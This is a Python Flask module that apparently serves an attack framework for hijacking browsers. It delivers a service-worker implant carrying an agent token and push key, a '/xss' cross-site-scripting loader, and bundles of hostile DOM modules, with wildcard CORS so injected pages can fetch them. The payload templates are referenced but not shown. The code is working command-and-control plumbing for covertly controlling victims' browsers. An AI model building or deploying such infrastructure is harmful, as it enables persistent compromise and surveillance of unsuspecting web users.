import os
from flask import render_template, request, Blueprint
from config import Config

modules = Blueprint('modules', __name__)

@modules.after_request
def apply_cors(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "*"
    return response

@modules.route('/sw.js')
def sw():
    vapidPub = os.popen("vapid --applicationServerKey | cut -d' ' -f5").read().strip()
    res = render_template('sw.js', vapidPub = vapidPub)
    res += render_template('utils.js', host = request.host, agent_token = Config.AGENT_TOKEN)
    return res, {'Content-Type': 'application/javascript'}

@modules.route('/xss')
def xss():
    path = request.args.get('path')
    if path == None or path == '':
        path = '/sw.js'
    return render_template('xss.js', path = path), {'Content-Type': 'application/javascript'}

@modules.route('/dom')
def dom():
    res = render_template('utils.js', host = request.host, agent_token = Config.AGENT_TOKEN)
    files = os.listdir('app/templates/dom_modules')
    for name in files:
        res += render_template('dom_modules/' + name)
        res += "; "
    return res, {'Content-Type': 'application/javascript'}
    
@modules.route('/<name>')
def moduleName(name):
    try:
        return render_template('modules/' + name +'.js'), {'Content-Type': 'application/javascript'}
    except:
        return ""
    